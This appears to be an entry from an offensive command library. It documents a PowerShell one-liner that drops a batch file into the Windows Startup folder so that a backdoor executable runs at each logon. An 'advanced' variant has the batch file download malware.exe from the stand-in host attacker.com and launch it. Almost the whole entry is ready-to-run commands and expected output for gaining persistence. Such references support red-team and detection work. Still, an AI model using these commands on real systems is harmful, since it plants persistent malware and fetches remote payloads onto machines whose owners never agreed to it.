---
id: 39ff9ddc-68db-44c0-9368-5be6dd546894
name: powershell-create-startup-batch-file
type: command
executor: powershell
data: >-
  New-Item -Path "$env:APPDATA\Microsoft\Windows\Start
  Menu\Programs\Startup\backdoor.bat" -ItemType File -Force -Value "start /b
  C:\Users\$env:USERNAME\AppData\Local\Temp\backdoor.exe"
output: null
created_at: '2023-04-06T03:56:27.811802+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - persistence
  - startup
verified: true
validated: true
---

# powershell-create-startup-batch-file

## Command

```powershell
New-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat" -ItemType File -Force -Value "start /b C:\Users\$env:USERNAME\AppData\Local\Temp\backdoor.exe"
```

## Description

Creates a batch file in the user's Windows Startup folder to execute a backdoor on logon. Use this in low-privilege persistence scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-Path` | Full path to the Startup folder file (uses env vars for user-specific) | Yes |
| `-ItemType File` | Specifies creation of a file | Yes |
| `-Force` | Overwrites if file exists | No |
| `-Value` | Content of the batch file (launch command) | Yes |

## Examples

### Basic Usage

```powershell
New-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat" -ItemType File -Force -Value "start /b C:\Users\$env:USERNAME\AppData\Local\Temp\backdoor.exe"
```

### Advanced Usage (Custom Payload)

```powershell
New-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat" -ItemType File -Force -Value "powershell -c 'Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile $env:TEMP\malware.exe; Start-Process $env:TEMP\malware.exe'"
```

## Expected Output

Directory: C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Mode                 LastWriteTime         Length Name

----                 -------------         ------ ----

-a----         10/1/2023   12:00 AM              0 backdoor.bat

No errors indicate success; verify with Get-Content on the file.

## Related

- [[procedures/Windows-User-Startup-Folder-Persistence]]
- [[commands/cmd-start-backdoor-executable]]
